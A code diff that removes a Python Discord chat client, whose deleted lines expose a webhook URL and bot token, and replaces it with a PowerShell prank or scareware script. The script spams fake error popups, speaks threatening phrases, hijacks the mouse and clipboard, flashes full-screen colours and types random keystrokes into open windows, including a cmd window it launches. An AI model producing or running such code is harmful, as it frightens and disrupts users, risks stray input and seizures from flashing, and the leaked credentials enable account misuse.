@@ -1,38 +1,105 @@
-import discord
-import requests
-import threading
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Speech
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1356810627909419079/5L26qDamgl753mBQL873Mq982SK6K4_2HH-mMmrfkOASId1GXyup-vVKOXbbDw6OC2iO"
-BOT_TOKEN = "MTM1NjgwNzIyMTgxOTk5ODIzOQ.GugL7a.B6pyc-ehNYTI7crXr8V433riRTvLd7tNg8AQtg"  # Replace with your bot token
-PEER_NAME = "Peer1"
-OTHER_PEER = "Peer2"
+# Invert screen colors using Magnifier
+Start-Process "magnify.exe"
+Start-Sleep -Seconds 2
+[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")
 
-intents = discord.Intents.default()
-intents.messages = True
-intents.message_content = True
+# VOICE ATTACK
+Start-Job {
+    $speak = New-Object -ComObject SAPI.SpVoice
+    $words = "Chaos", "System overload", "I see you", "No escape", "Collapse", "Everything is noise"
+    for ($i = 0; $i -lt 20; $i++) {
+        $speak.Speak($words | Get-Random)
+        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 400)
+    }
+}
 
-class ChatClient(discord.Client):
-    async def on_ready(self):
-        print(f"{PEER_NAME} ready! Type messages below:")
+# POPUP SPAM
+Start-Job {
+    for ($i = 0; $i -lt 50; $i++) {
+        $msg = "ERROR CODE 0x" + (Get-Random -Minimum 1000 -Maximum 9999)
+        [System.Windows.Forms.MessageBox]::Show($msg, "System Failure", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+        Start-Sleep -Milliseconds 250
+    }
+}
 
-    async def on_message(self, message):
-        if message.author == self.user or not message.webhook_id:
-            return
-        
-        content = message.content
-        if content.startswith(f"[{OTHER_PEER}]"):
-            print(f"\n{OTHER_PEER}: {content[len(OTHER_PEER)+2:]}\n> ", end='')
+# CLIPBOARD CHAOS
+Start-Job {
+    for ($i = 0; $i -lt 100; $i++) {
+        Set-Clipboard ("💥 CHAOS MODE 💀 " * (Get-Random -Minimum 3 -Maximum 6))
+        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 200)
+    }
+}
 
-def send_messages():
-    while True:
-        message = input("> ")
-        requests.post(WEBHOOK_URL, json={"content": f"[{PEER_NAME}] {message}"})
+# RANDOM MOUSE
+Start-Job {
+    for ($i = 0; $i -lt 1000; $i++) {
+        $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
+        $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+        Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 40)
+    }
+}
 
-def run_bot():
-    client = ChatClient(intents=intents)
-    client.run(BOT_TOKEN)
+# RANDOM INPUT
+Start-Job {
+    $keys = @("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5")
+    for ($i = 0; $i -lt 1000; $i++) {
+        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
+        Start-Sleep -Milliseconds (Get-Random -Minimum 5 -Maximum 30)
+    }
+}
 
-if __name__ == "__main__":
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    send_messages()
+# FULLSCREEN FLASH
+Start-Job {
+    for ($i = 0; $i -lt 30; $i++) {
+        $form = New-Object Windows.Forms.Form
+        $form.FormBorderStyle = 'None'
+        $form.TopMost = $true
+        $form.WindowState = 'Maximized'
+        $form.BackColor = [System.Drawing.Color]::FromArgb(
+            (Get-Random -Minimum 0 -Maximum 255),
+            (Get-Random -Minimum 0 -Maximum 255),
+            (Get-Random -Minimum 0 -Maximum 255))
+        $form.Show()
+        Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 160)
+        $form.Close()
+    }
+}
+
+# LAUNCH RANDOM APPS
+Start-Job {
+    $apps = @("notepad", "calc", "mspaint", "write", "cmd")
+    for ($i = 0; $i -lt 20; $i++) {
+        Start-Process ($apps | Get-Random)
+        Start-Sleep -Milliseconds 300
+    }
+}
+
+# BEEP STORM
+Start-Job {
+    for ($i = 0; $i -lt 100; $i++) {
+        [console]::beep((Get-Random -Minimum 100 -Maximum 3000), (Get-Random -Minimum 50 -Maximum 200))
+    }
+}
+
+# Fake Taskbar Flash
+Start-Job {
+    $f = New-Object Windows.Forms.Form
+    $f.Text = "taskmgr.exe"
+    $f.BackColor = 'Red'
+    $f.TopMost = $true
+    $f.Width = 300
+    $f.Height = 100
+    $f.Show()
+    Start-Sleep -Seconds 10
+    $f.Close()
+}
+
+# Wrap up after ~20 seconds
+Start-Sleep -Seconds 20
+[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")  # Undo invert
+Write-Host "`n💀 Annihilation Complete. Reboot to recover sanity." -ForegroundColor Red
